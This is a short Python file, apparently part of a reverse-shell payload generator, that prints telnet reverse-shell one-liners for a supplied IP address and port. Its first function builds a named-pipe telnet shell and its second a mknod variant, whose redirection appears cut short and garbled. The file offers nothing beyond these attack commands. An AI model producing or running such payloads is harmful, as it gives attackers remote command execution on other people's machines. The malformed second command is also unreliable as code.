from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def TelnetShell(ip, port):
    payload = f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"shell",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")

def TelnetShell2(ip, port):
    payload = f"rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p"
    myStyle = Style(color="#7780ff", bold=True)
    console.print("\nThe payload is: \n", style=myStyle)
    synt = Syntax(payload,"shell",theme='dracula', line_numbers=True)
    console.print(synt)
    print("\n")